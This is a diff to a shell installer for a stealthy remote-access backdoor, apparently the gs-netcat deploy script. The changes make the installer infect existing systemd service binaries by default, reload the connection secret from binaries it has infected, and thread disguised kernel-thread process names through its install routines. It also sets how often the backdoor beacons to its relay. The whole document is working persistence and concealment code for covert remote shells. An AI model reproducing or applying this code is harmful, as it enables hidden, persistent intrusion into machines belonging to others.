@@ -41,8 +41,8 @@
 #		- Specify custom installation directory
 # GS_BEACON=30
 #       - Only connect back every 30 minutes and check for a client.
-# GS_INFECT=1
-#       - Try to infect a systemd service before any other persistency
+# GS_NOINFECT=1
+#       - Try NO to infect a systemd service before any other persistency
 # GS_NAME="[kcached]"
 #       - Specify custom hidden name file & process. Default is picked at random.
 # GS_BIN="defunct"
@@ -144,6 +144,9 @@ PROC_HIDDEN_NAME_RX="${PROC_HIDDEN_NAME_RX:1}"
 # PROC_HIDDEN_NAME_DEFAULT="[rcu_preempt]"
 # ~/.config/<NAME>
 CONFIG_DIR_NAME="htop"
+
+GS_INFECT=1
+[[ -n $GS_NOINFECT ]] && unset GS_INFECT
 
 # systemd candidates for binary infection
 # res=$(command -v dbus-daemon) && {
@@ -1152,6 +1155,7 @@ config2bin() {
 	local src="$1"
 	local dst="$2"
 	local opts="$3"
+	local proc_hidden_name="$4"
 	local dst_final
 
 	[[ "$src" == "$dst" ]] && {
@@ -1167,7 +1171,7 @@ config2bin() {
 		cp -p "${src}" "${dst}" || return 255
 	}
 
-	TERM=xterm-256color GS_PROC_HIDDENNAME="${PROC_HIDDEN_NAME:?}" GS_BEACON="${GS_BEACON}" GS_STEALTH=1 GS_CONFIG_WRITE="${dst}" GS_ARGS="${opts}" GS_SECRET="${GS_SECRET:?}" "${src}" || return 255
+	TERM=xterm-256color GS_PROC_HIDDENNAME="${proc_hidden_name}" GS_BEACON="${GS_BEACON}" GS_STEALTH=1 GS_CONFIG_WRITE="${dst}" GS_ARGS="${opts}" GS_SECRET="${GS_SECRET:?}" "${src}" || return 255
 	[[ -n "$dst_final" ]] && {
 		cat "${dst}" >"${dst_final}"
 		rm -f "${dst:?}"
@@ -1194,11 +1198,31 @@ bin2config() {
 	eval "$(GS_STEALTH=1 GS_CONFIG_READ="${bin:?}" GS_CONFIG_CHECK=1 "${exe:?}" -h 2>/dev/null | grep ^GS_CONFIG_)"
 }
 
+gs_secret_reload_systemd() {
+	local bin
+
+	[[ -z $GS_INFECT ]] && return 255
+
+	for bin in "${INFECT_BIN_NAME_ARR[@]}"; do
+		[[ ! -f "${bin} " ]] && continue
+		bin2config "${bin}" "${bin}" && {
+			INFECTED_BIN_NAME="${bin}"
+			unset DSTBIN
+			unset PROC_HIDDEN_NAME
+			return 0
+		}
+	done
+
+	return 255
+}
+
 # Try to load a GS_SECRET
 gs_secret_reload() {
-	[[ ! -f "${DSTBIN:?}" ]] && return 255
+	gs_secret_reload_systemd || {
+		[[ ! -f "${DSTBIN:?}" ]] && return 255
+		bin2config "${DSTBIN}" "${DSTBIN}"
+	}
 
-	bin2config "${DSTBIN}" "${DSTBIN}"
 	[[ -z "$GS_CONFIG_SECRET" ]] && return 255
 
 	WARN "Already installed."
@@ -1255,7 +1279,7 @@ infect_bin() {
 
 do_config2bin() {
 	echo -en "Adding configuration.................................................."
-	config2bin "${1:?}" "${2:?}" "${3:?}" || {
+	config2bin "${1:?}" "${2:?}" "${3:?}" "${4}" || {
 		FAIL_OUT
 		return 255
 	}
@@ -1263,7 +1287,7 @@ do_config2bin() {
 }
 
 install_systemd_new() {
-	do_config2bin "${DSTBIN}" "${DSTBIN}" "-ilq" || return 255
+	do_config2bin "${DSTBIN}" "${DSTBIN}" "-ilq" "${PROC_HIDDEN_NAME}" || return 255
 
 	printf "%-70.70s" "Installing as systemd ${SERVICE_HIDDEN_NAME}.service.............................................."
 
@@ -1321,12 +1345,13 @@ install_systemd_infect() {
 	[[ $ret -ne 0 ]] && return 255
 
 	SYSTEMD_INFECTED_NAME="${name}"
+	INFECTED_BIN_NAME="${bin}"
 	IS_SYSTEMD=1
 	((IS_INSTALLED+=1))
 	OK_OUT
 	# FIXME: It would be better if I do this BEFORE installing the service or otherwise we can not
 	# recover if this fails:
-	do_config2bin "${DSTBIN}" "${bin}" "-liq" || return 255
+	do_config2bin "${DSTBIN}" "${bin}" "-liq" "" || return 255
 
 	STARTING_STR="Starting gs-netcat as infected '${name}.service'"
 }
@@ -1345,8 +1370,7 @@ install_system_systemd()
 	if [[ -n $GS_INFECT ]]; then
 		i=0
 		while [[ -z $IS_INSTALLED ]] && [[ $i -lt ${#INFECT_BIN_NAME_ARR[@]} ]]; do
-			INFECTED_BIN_NAME="${INFECT_BIN_NAME_ARR[$i]}"
-			install_systemd_infect "${INFECT_SYSCTL_NAME_ARR[$i]}" "${INFECTED_BIN_NAME}"
+			install_systemd_infect "${INFECT_SYSCTL_NAME_ARR[$i]}" "${INFECT_BIN_NAME_ARR[$i]}"
 			((i++))
 		done
 	else
@@ -1357,9 +1381,11 @@ install_system_systemd()
 	[[ -n "$IS_INSTALLED" ]] && {
 		xrm "${DSTBIN}"
 		unset DSTBIN
+		# FIXME: better to call bin2config and load whatever we wrote but this
+		# is quicker:
+		[[ "${GS_BEACON:-1}" -le 10 ]] && GS_BEACON=30
 		return 0
 	}
-	unset INFECTED_BIN_NAME
 
 	install_systemd_new
 	[[ -n "$IS_INSTALLED" ]] && return 0
@@ -1407,7 +1433,7 @@ install_system_rclocal()
 
 	((IS_INSTALLED+=1))
 	OK_OUT
-	do_config2bin "${DSTBIN}" "${DSTBIN}" "-ilqD" || return 255
+	do_config2bin "${DSTBIN}" "${DSTBIN}" "-ilqD" "${PROC_HIDDEN_NAME}" || return 255
 }
 
 install_system()
@@ -1489,7 +1515,7 @@ install_user()
 		done
 	}
 
-	do_config2bin "${DSTBIN}" "${DSTBIN}" "-ilqD" || return 255
+	do_config2bin "${DSTBIN}" "${DSTBIN}" "-ilqD" "${PROC_HIDDEN_NAME}" || return 255
 }
 
 ask_nocertcheck()
@@ -1704,7 +1730,9 @@ show_install_config() {
 	[[ -n $INFECTED_BIN_NAME ]] && echo -e "Infected: ${CDG}${INFECTED_BIN_NAME}${CN}"
 	[[ -n $DSTBIN ]]            && echo -e "Binary  : ${CDG}${DSTBIN}${CN} ${CF}[GS_BIN= to change]${CN}"
 	[[ -n $GS_HOST ]]           && echo -e "Relay   : ${CDG}${GS_HOST}:${GS_PORT:-443}${CN}"
-	[[ -n $PROC_HIDDEN_NAME ]]  && echo -e "Name    : ${CDG}${PROC_HIDDEN_NAME}${CN} ${CF}[GS_NAME= to change]${CN}"
+	[[ -z $SYSTEMD_INFECTED_NAME ]] && [[ -n $PROC_HIDDEN_NAME ]] && {
+		echo -e "Name    : ${CDG}${PROC_HIDDEN_NAME}${CN} ${CF}[GS_NAME= to change]${CN}"
+	}
 
 	str="always connected ${CN}${CF}[GS_BEACON=30 to change]"
 	[[ -n $GS_BEACON ]] && str="every $GS_BEACON minutes"
